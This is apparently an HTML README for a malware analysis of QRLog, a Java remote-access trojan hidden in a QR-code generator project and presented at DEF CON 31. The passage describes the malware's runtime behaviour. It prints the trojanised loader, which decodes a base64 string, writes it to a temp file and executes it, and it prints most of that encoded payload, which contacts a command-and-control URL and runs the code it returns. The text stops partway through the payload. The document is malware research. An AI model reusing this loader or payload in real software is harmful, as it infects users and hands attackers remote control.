@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>qrlog.README</title>
+  <style>
+html {
+color: #1a1a1a;
+background-color: #fdfdfd;
+}
+body {
+margin: 0 auto;
+padding-left: 20px;
+padding-right: 20px;
+padding-top: 20px;
+padding-bottom: 20px;
+hyphens: auto;
+overflow-wrap: break-word;
+text-rendering: optimizeLegibility;
+font-kerning: normal;
+}
+@media (max-width: 800px) {
+body {
+font-size: 0.9em;
+padding: 12px;
+}
+h1 {
+font-size: 1.8em;
+}
+}
+@media print {
+html {
+background-color: white;
+}
+body {
+background-color: transparent;
+color: black;
+font-size: 12pt;
+}
+p, h2, h3 {
+orphans: 3;
+widows: 3;
+}
+h2, h3, h4 {
+page-break-after: avoid;
+}
+}
+p {
+margin: 1em 0;
+}
+a {
+color: #1a1a1a;
+}
+a:visited {
+color: #1a1a1a;
+}
+img {
+max-width: 100%;
+}
+svg {
+height: auto;
+max-width: 100%;
+}
+h1, h2, h3, h4, h5, h6 {
+margin-top: 1.4em;
+}
+h5, h6 {
+font-size: 1em;
+font-style: italic;
+}
+h6 {
+font-weight: normal;
+}
+ol, ul {
+padding-left: 1.7em;
+margin-top: 1em;
+}
+li > ol, li > ul {
+margin-top: 0;
+}
+blockquote {
+margin: 1em 0 1em 1.7em;
+padding-left: 1em;
+border-left: 2px solid #e6e6e6;
+color: #606060;
+}
+code {
+font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+font-size: 85%;
+margin: 0;
+hyphens: manual;
+}
+pre {
+margin: 1em 0;
+overflow: auto;
+}
+pre code {
+padding: 0;
+overflow: visible;
+overflow-wrap: normal;
+}
+.sourceCode {
+background-color: transparent;
+overflow: visible;
+}
+hr {
+background-color: #1a1a1a;
+border: none;
+height: 1px;
+margin: 1em 0;
+}
+table {
+margin: 1em 0;
+border-collapse: collapse;
+width: 100%;
+overflow-x: auto;
+display: block;
+font-variant-numeric: lining-nums tabular-nums;
+}
+table caption {
+margin-bottom: 0.75em;
+}
+tbody {
+margin-top: 0.5em;
+border-top: 1px solid #1a1a1a;
+border-bottom: 1px solid #1a1a1a;
+}
+th {
+border-top: 1px solid #1a1a1a;
+padding: 0.25em 0.5em 0.25em 0.5em;
+}
+td {
+padding: 0.125em 0.5em 0.25em 0.5em;
+}
+header {
+margin-bottom: 4em;
+text-align: center;
+}
+#TOC li {
+list-style: none;
+}
+#TOC ul {
+padding-left: 1.3em;
+}
+#TOC > ul {
+padding-left: 0;
+}
+#TOC a:not(:hover) {
+text-decoration: none;
+}
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+
+ul.task-list[class]{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+font-size: inherit;
+width: 0.8em;
+margin: 0 0.8em 0.2em -1.6em;
+vertical-align: middle;
+}
+.display.math{display: block; text-align: center; margin: 0.5rem auto;}
+
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+{ counter-reset: source-line 0; }
+pre.numberSource code > span
+{ position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+{ content: counter(source-line);
+position: relative; left: -1em; text-align: right; vertical-align: baseline;
+border: none; display: inline-block;
+-webkit-touch-callout: none; -webkit-user-select: none;
+-khtml-user-select: none; -moz-user-select: none;
+-ms-user-select: none; user-select: none;
+padding: 0 4px; width: 4em;
+}
+pre.numberSource { margin-left: 3em; padding-left: 4px; }
+div.sourceCode
+{ color: #cccccc; background-color: #303030; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ffcfaf; } 
+code span.an { color: #7f9f7f; font-weight: bold; } 
+code span.at { } 
+code span.bn { color: #dca3a3; } 
+code span.bu { } 
+code span.cf { color: #f0dfaf; } 
+code span.ch { color: #dca3a3; } 
+code span.cn { color: #dca3a3; font-weight: bold; } 
+code span.co { color: #7f9f7f; } 
+code span.cv { color: #7f9f7f; font-weight: bold; } 
+code span.do { color: #7f9f7f; } 
+code span.dt { color: #dfdfbf; } 
+code span.dv { color: #dcdccc; } 
+code span.er { color: #c3bf9f; } 
+code span.ex { } 
+code span.fl { color: #c0bed1; } 
+code span.fu { color: #efef8f; } 
+code span.im { } 
+code span.in { color: #7f9f7f; font-weight: bold; } 
+code span.kw { color: #f0dfaf; } 
+code span.op { color: #f0efd0; } 
+code span.ot { color: #efef8f; } 
+code span.pp { color: #ffcfaf; font-weight: bold; } 
+code span.sc { color: #dca3a3; } 
+code span.ss { color: #cc9393; } 
+code span.st { color: #cc9393; } 
+code span.va { } 
+code span.vs { color: #cc9393; } 
+code span.wa { color: #7f9f7f; font-weight: bold; } 
+</style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<h1 id="qrlog">QRLog</h1>
+<ul>
+<li><a href="#riding">Riding with the Chollimas - QRLog DEF CON 31
+Talk</a></li>
+<li><a href="#english">QRLog Malware Analysis (English)</a></li>
+<li><a href="#espanol">QRLog Análisis de Malware (Español)</a></li>
+</ul>
+<h1 id="talk-riding-with-the-chollimas">Talk: Riding with the
+Chollimas</h1>
+<h2 id="presentations">Presentations</h2>
+<table>
+<colgroup>
+<col style="width: 20%" />
+<col style="width: 20%" />
+<col style="width: 20%" />
+<col style="width: 20%" />
+<col style="width: 20%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>#</th>
+<th>Date</th>
+<th>Conference</th>
+<th>Link to Video</th>
+<th>Link to Slides</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>AGO-2023</td>
+<td>DEFCON 31 Recon Village</td>
+<td>https://www.youtube.com/watch?v=DB6yDJeb6U8</td>
+<td>https://docs.google.com/presentation/d/1mQuauuJCdDI9d_HfIvLdtk_vM4FU4v0AUmlTShV9_hI</td>
+</tr>
+</tbody>
+</table>
+<h1 id="qrlog-malware-analysis">QRLog Malware Analysis</h1>
+<ul>
+<li><a href="#espanol">Español</a>
+<ul>
+<li><a href="#introduccion">Introducción</a></li>
+<li><a href="#comportamiento">Comportamiento</a></li>
+<li><a href="#analisis">Análisis de código fuente</a></li>
+<li><a href="#indicadores">IOCs</a></li>
+<li><a href="#muestras">Muestras</a></li>
+<li><a href="#referencias">Referencias</a></li>
+</ul></li>
+<li><a href="#english">English</a>
+<ul>
+<li><a href="#intro">Intro</a></li>
+<li><a href="#behaviour">Behaviour</a></li>
+<li><a href="#analysis">Code Analysis</a></li>
+<li><a href="#indicators">IOCs</a></li>
+<li><a href="#samples">Samples</a></li>
+<li><a href="#references">References</a></li>
+</ul></li>
+</ul>
+<h1 id="español">Español</h1>
+<h2 id="introducción">Introducción</h2>
+<p>En Febrero de 2023 encontré por primera vez una muestra del malware
+QRLog <em>in the wild</em>. Le asigné este nombre debido a que se
+ocultaba entre los archivos de un generador de códigos QR escrito en
+Java y crea un archivo con ese mismo nombre para su persistencia.</p>
+<p>Es un malware sencillo - y en apariencia, de fabricación casera - de
+tipo RAT (<em>Remote Access Tool</em>) que intenta abrir una <em>shell
+reversa</em> otorgando al atacante acceso privilegiado al equipo
+infectado.</p>
+<p>Al momento de escribir esta investigación no existen menciones
+públicas a este malware o a sus componentes, como tampoco detecciones
+por parte de software antivirus o plataformas de seguridad, lo que nos
+indica estar ante una muestra novel <a href="#referencias">[1]</a>. Sin
+embargo algunas plataformas de inteligencia como CMC (Vietnam) han
+marcado el enlace original al archivo como sospechoso <a href="#referencias">[1]</a>, y en otras es posible encontrar menciones a
+parte de su infraestructura C2 (asociada a Cobalt Strike y cuya
+reutilización es común)<a href="#referencias">[2][3]</a>.</p>
+<h2 id="comportamiento">Comportamiento</h2>
+<p>El proyecto es funcional y no presenta en primera instancia rasgos
+sospechosos. Sin embargo, un análisis de comportamiento en tiempo de
+ejecución llevado a cabo por Crowdstrike Falcon detectó - y bloqueó -
+una serie de acciones potencialmente maliciosas: - La lectura de la
+configuración de red mediante el comando <code>ifconfig</code> - El
+envío de una única solicitud ICMP <code>ping</code> a un servidor
+externo - La creación de directorios temporales con una serie de números
+aleatorios en su nombre - La escritura de un archivo <code>.java</code>
+en el directorio temporal (QRLog.java) y su posterior ejecución - La
+escritura de otros archivos con extensiones <code>.java</code> y
+<code>.dat</code> en dichos directorios temporales (prefTmp.java, p.dat)
+y su posterior ejecución - El borrado de dichos archivos</p>
+<p>Ante la inexistencia de material sobre este malware se decidió
+proceder a un análisis manual. En primera instancia la búsqueda de
+cadenas de texto que referencien los nombres de los archivos creados
+arrojó resultados positivos:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">#Buscar &quot;qrlog&quot; en referencia al archivo QRLog.java, primer archivo escrito en las carpetas temporales</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> grep <span class="ex">-rnwi</span> <span class="st">&quot;qrlog&quot;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/google/zxing/qrcode/QRCodeWriter.java:87:errPath</span> = System.getProperty<span class="er">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="kw">)</span><span class="ex">+</span> <span class="st">&quot;</span><span class="dt">\\</span><span class="st">QRLog.java&quot;</span><span class="kw">;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/google/zxing/qrcode/QRCodeWriter.java:89:errPath</span> = System.getProperty<span class="er">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="kw">)</span><span class="ex">+</span> <span class="st">&quot;/QRLog.java&quot;</span><span class="kw">;</span></span></code></pre></div>
+<p>El archivo <code>QRCodeWriter.java</code> es quien crea originalmente
+el archivo <code>QRLog.java</code> y es un buen candidato para comenzar
+la investigación. Teniendo una referencia sólida fue posible comenzar el
+análisis del código Java.</p>
+<h2 id="análisis-de-código-fuente">Análisis de código fuente</h2>
+<p>Al analizar el archivo <code>QRCodeWriter.java</code> (disponible
+para descargar individualmente en la sección <a href="#muestras">Muestras</a>) llama inmediatamente la atención la
+siguiente función:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span><span class="op">{</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> errPath<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>            errPath <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">QRLog.java&quot;</span><span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>            errPath <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)+</span> <span class="st">&quot;/QRLog.java&quot;</span><span class="op">;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        <span class="bu">FileOutputStream</span> qrW <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileOutputStream</span><span class="op">(</span>errPath<span class="op">);</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        qrW<span class="op">.</span><span class="fu">write</span><span class="op">(</span>b64dec<span class="op">);</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span><span class="st">&quot;java &quot;</span> <span class="op">+</span> errPath<span class="op">);</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> ex<span class="op">){</span>   </span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span></code></pre></div>
+<p>En esta función el malware intenta determinar vagamente sobre qué
+plataforma se estrá trabajando (Windows o Unix), para entender dónde y
+cómo (con barra invertida o no) escribir un archivo “de log” con
+extensión <code>.java</code>. A este archivo le escribe el contenido de
+la variable <code>b64dec</code> la cual puede encontrarse unas líneas
+más arriba en el archivo.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">byte</span> <span class="op">[]</span> b64dec <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>QUIET_ZONE_DATA<span class="op">);</span></span></code></pre></div>
+<p>Como podemos ver en este fragmento, <code>b64dec</code> almacena el
+resultado de decodificar la variable <code>QUIET_ZONE_DATA</code> desde
+<code>base64</code>. Indagando un poco más en el código es posible
+encontrar el contenido de <code>QUIET_ZONE_DATA</code>:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> QUIET_ZONE_DATA <span class="op">=</span> <span class="st">&quot;aW1wb3J0IGphdmEuaW8uSU9FeGNlcHRpb247CmltcG9ydCBqYXZhLm5ldC5VUkk7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBDbGllb&quot;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;nQ7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBSZXF1ZXN0OwppbXBvcnQgamF2YS5uZXQuaHR0cC5IdHRwUmVzcG9uc2U7CmltcG9ydCBqYXZhLm5pby5jaGFyc2V0LlN0YW5&quot;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;kYXJkQ2hhcnNldHM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS51dGlsLlJhbmRvbTsKaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7CmltcG9yd&quot;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CBqYXZhLmlvLkZpbGU7CmltcG9ydCBqYXZhLmlvLkZpbGVXcml0ZXI7CmltcG9ydCBqYXZhLmxhbmcuVGhyZWFkOwoKcHVibGljIGNsYXNzIFFSTG9nIHsKCiAgICBwcml2YXR&quot;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;lIHN0YXRpYyBmaW5hbCBTdHJpbmcgUE9TVF9VUkwgPSAiaHR0cHM6Ly93d3cuZ2l0LWh1Yi5tZS92aWV3LnBocCI7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3Rya&quot;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;W5nW10gYXJncykgdGhyb3dzIElPRXhjZXB0aW9uewoKICAgICAgICBzZW5kUE9TVCgpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFN0cmluZyByYW5kR2VuKCkgdGhyb3d&quot;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;zIElPRXhjZXB0aW9uIHsKICAgICAgICBTdHJpbmcgc3RyUG9vbCA9ICIxMjM0NTY3ODkiOwogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpO&quot;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;wogICAgICAgIFJhbmRvbSByYW5kID0gbmV3IFJhbmRvbSgpOwogICAgICAgIAogICAgICAgIGZvciAoaW50IGk9MDsgaTw4OyBpKyspewogICAgICAgICAgICBzYi5hcHBlbmQ&quot;</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;oc3RyUG9vbC5jaGFyQXQocmFuZC5uZXh0SW50KHN0clBvb2wubGVuZ3RoKCkpKSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBzYi50b1N0cmluZygpOwogI&quot;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgfQogICAgCiAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgZ2V0T3BlcmF0aW5nU3lzdGVtKCkgewogICAgICAgIFN0cmluZyBvcyA9IFN5c3RlbS5nZXRQcm9wZXJ0eSgib3M&quot;</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ubmFtZSIpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBudWxsOwogICAgICAgIAogICAgICAgIGlmIChvcy5jb250YWlucygiV2luZG93cyIpKQogICAgICAgICAgICByZXN1b&quot;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;HQgPSAiMCI7CiAgICAgICAgZWxzZSBpZiAob3MuY29udGFpbnMoIkxpbnV4IikpCiAgICAgICAgICAgIHJlc3VsdCA9ICIyIjsKICAgICAgICBlbHNlIGlmIChvcy5jb250YWl&quot;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ucygiTWFjIE9TIFgiKSkKICAgICAgICAgICAgcmVzdWx0ID0gIjEiOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICAKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgc&quot;</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;2VuZFBPU1QoKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgIFN0cmluZyB1aWQgPSByYW5kR2VuKCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBkYXRhID0gbmV3IFN0cml&quot;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uZ0J1aWxkZXIoKTsKICAgICAgICBTdHJpbmcgc2VjX3BhdGggPSAiIjsKICAgICAgICBkYXRhLmFwcGVuZCgiR0lUSFVCX1JFUSIpOwogICAgICAgIGRhdGEuYXBwZW5kKHVpZ&quot;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;Ck7CiAgICAgICAgZGF0YS5hcHBlbmQoIjIwMDAiKTsKICAgICAgICBkYXRhLmFwcGVuZChnZXRPcGVyYXRpbmdTeXN0ZW0oKSk7CiAgICAgICAgCiAgICAgICAgd2hpbGUgKHR&quot;</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ydWUpCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKHNlY19wYXRoLmxlbmd0aCgpID4gMSkgewogICAgICAgICAgICAgICAgICAgIEZpb&quot;</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;GUgc2VjRmlsZSA9IG5ldyBGaWxlKHNlY19wYXRoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc2VjRmlsZS5leGlzdHMoKSkKICAgICAgICAgICAgICAgICAgICAgICAgU3l&quot;</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;zdGVtLmV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEh0dHBSZXF1ZXN0IHJlcXVlc3QgPSBIdHRwUmVxdWVzdC5uZ&quot;</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;XdCdWlsZGVyKCkKICAgICAgICAgICAgICAgICAgICAuaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIpCiAgICAgICAgICA&quot;</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gICAgICAgICAgLnZlcnNpb24oSHR0cENsaWVudC5WZXJzaW9uLkhUVFBfMV8xKQogICAgICAgICAgICAgICAgICAgIC51cmkoVVJJLmNyZWF0ZShQT1NUX1VSTCkpCiAgICAgI&quot;</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICAgICAgICAgLlBPU1QoSHR0cFJlcXVlc3QuQm9keVB1Ymxpc2hlcnMub2ZTdHJpbmcoZGF0YS50b1N0cmluZygpKSkKICAgICAgICAgICAgICAgICAgICAuYnVpbGQ&quot;</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;oKTsKICAgICAgICAgICAgICAgIEh0dHBDbGllbnQgY2xpZW50ID0gSHR0cENsaWVudC5uZXdIdHRwQ2xpZW50KCk7CiAgICAgICAgICAgICAgICBIdHRwUmVzcG9uc2U8U3Rya&quot;</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;W5nPiByZXNwb25zZSA9IGNsaWVudC5zZW5kKHJlcXVlc3QsIEh0dHBSZXNwb25zZS5Cb2R5SGFuZGxlcnMub2ZTdHJpbmcoKSk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9&quot;</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uc2Uuc3RhdHVzQ29kZSgpICE9IDIwMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTAwMCk7CiAgICAgICAgICAgICAgICAgI&quot;</span></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTdHJpbmcgcmVzU3RyID0gcmVzcG9uc2UuYm9keSgpOwogICAgICAgICAgICAgICAgaWYgKCF&quot;</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;yZXNTdHIuc3RhcnRzV2l0aCgiR0lUSFVCX1JFUyIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGF0YSBFcnJvc&quot;</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;iIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXNTdHIubGVuZ3RoKCkgPiAxMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICA&quot;</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gICAgICAgICBTdHJpbmcgZW5jX2RhdGEgPSByZXNTdHIuc3Vic3RyaW5nKDEwKTsKICAgICAgICAgICAgICAgICAgICBieXRlIFtdIGRlY19kYXRhID0gQmFzZTY0LmdldERlY&quot;</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;29kZXIoKS5kZWNvZGUoZW5jX2RhdGEpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfZmlsZSA9IG5ldyBTdHJpbmcoZGVjX2RhdGEsIFN0YW5kYXJkQ2hhcnNldHM&quot;</span></span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uVVRGXzgpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfcGF0aDsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoSW50ZWdlci5wY&quot;</span></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;XJzZUludChnZXRPcGVyYXRpbmdTeXN0ZW0oKSkgPT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9yZ19wYXRoID0gU3lzdGVtLmd&quot;</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ldFByb3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIlxccHJlZlRtcC5qYXZhIjsKICAgICAgICAgICAgICAgICAgICAgICAgc2VjX3BhdGggPSBTeXN0ZW0uZ2V0UHJvcGVyd&quot;</span></span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;HkoImphdmEuaW8udG1wZGlyIikgKyAiXFxwLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3JnX3BhdGggPSBTeXN&quot;</span></span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;0ZW0uZ2V0UHJvcGVydHkoImphdmEuaW8udG1wZGlyIikgKyAiL3ByZWZUbXAuamF2YSI7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlY19wYXRoID0gU3lzdGVtLmdldFByb&quot;</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIi9wLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHRyeSAoRmlsZVdyaXRlciBmaWxlID0&quot;</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gbmV3IEZpbGVXcml0ZXIob3JnX3BhdGgsIHRydWUpO0J1ZmZlcmVkV3JpdGVyIGJ1ZmZlciA9IG5ldyBCdWZmZXJlZFdyaXRlcihmaWxlKSkgewogICAgICAgICAgICAgICAgI&quot;</span></span>
